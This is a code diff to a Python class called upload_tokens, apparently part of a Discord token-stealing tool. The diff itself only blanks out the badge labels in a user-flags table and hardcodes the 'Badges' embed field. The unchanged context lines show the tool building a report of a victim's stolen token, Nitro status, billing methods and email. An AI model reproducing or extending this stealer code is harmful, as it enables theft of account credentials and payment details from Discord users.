@@ -142,67 +142,67 @@ class upload_tokens:
     def calc_flags(self, flags: int) -> list:
         flags_dict = {
             "DISCORD_EMPLOYEE": {
-                "emoji": "Employee Bage",
+                "emoji": "---",
                 "shift": 0,
                 "ind": 1
             },
             "DISCORD_PARTNER": {
-                "emoji": "Partner Bage",
+                "emoji": "---",
                 "shift": 1,
                 "ind": 2
             },
             "HYPESQUAD_EVENTS": {
-                "emoji": "Hypesquad Events Bage",
+                "emoji": "---",
                 "shift": 2,
                 "ind": 4
             },
             "BUG_HUNTER_LEVEL_1": {
-                "emoji": "Bug Hunter 1 Bage",
+                "emoji": "---",
                 "shift": 3,
                 "ind": 4
             },
             "HOUSE_BRAVERY": {
-                "emoji": "",
+                "emoji": "---",
                 "shift": 6,
                 "ind": 64
             },
             "HOUSE_BRILLIANCE": {
-                "emoji": "",
+                "emoji": "---",
                 "shift": 7,
                 "ind": 128
             },
             "HOUSE_BALANCE": {
-                "emoji": "",
+                "emoji": "---",
                 "shift": 8,
                 "ind": 256
             },
             "EARLY_SUPPORTER": {
-                "emoji": "Early Supporter Bage",
+                "emoji": "---",
                 "shift": 9,
                 "ind": 512
             },
             "BUG_HUNTER_LEVEL_2": {
-                "emoji": "Bug Hunter 2 Bage",
+                "emoji": "---",
                 "shift": 14,
                 "ind": 16384
             },
             "VERIFIED_BOT_DEVELOPER": {
-                "emoji": "Verified Bot Dev Bage",
+                "emoji": "---",
                 "shift": 17,
                 "ind": 131072
             },
             "ACTIVE_DEVELOPER": {
-                "emoji": "<DE_BadgeNitro:865242433692762122>",
+                "emoji": "---",
                 "shift": 22,
                 "ind": 4194304
             },
             "CERTIFIED_MODERATOR": {
-                "emoji": "Moderator Bage",
+                "emoji": "---",
                 "shift": 18,
                 "ind": 262144
             },
             "SPAMMER": {
-                "emoji": "Spammer",
+                "emoji": "---",
                 "shift": 20,
                 "ind": 1048704
             },
@@ -344,7 +344,7 @@ class upload_tokens:
 
             embed.add_field(name="🔓 Token", value=f"```{token}```", inline=False)
             embed.add_field(name="🛒 Nitro", value=f"```{nitro}```", inline=True),
-            embed.add_field(name="🪪 Badges", value=f"```{badges if badges != '' else 'None'}```", inline=True)
+            embed.add_field(name="🪪 Badges", value=f"```{'---'}```", inline=True)
             embed.add_field(name="💰 Billing", value=f"```{payment_methods if payment_methods != '' else 'None'}```", inline=True)
 
             embed.add_field(name="📧 Email", value=f"```{email if email != None else 'None'}```", inline=True)
